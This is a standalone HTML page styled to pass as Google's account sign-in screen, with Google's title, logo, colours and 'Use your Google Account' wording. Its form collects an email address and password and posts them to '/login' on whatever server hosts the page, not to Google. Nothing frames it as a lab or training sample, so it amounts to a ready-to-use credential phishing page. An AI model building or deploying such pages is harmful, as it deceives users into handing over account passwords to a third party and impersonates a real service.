<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: roboto,"Noto Sans Myanmar UI",arial,sans-serif; background-color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #202124; }
        .card { width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin: 0; padding-top: 16px; }
        p { font-size: 16px; margin-top: 8px; margin-bottom: 40px; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 10px; box-sizing: border-box; }
        .btn-next { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; margin-top: 20px; }
        .footer { clear: both; padding-top: 40px; font-size: 12px; color: #70757a; text-align: left; }
    </style>
</head>
<body>
    <div class="card">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form action="/login" method="POST">
            <input type="text" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <button type="submit" class="btn-next">Next</button>
        </form>
    </div>
</body>
</html>
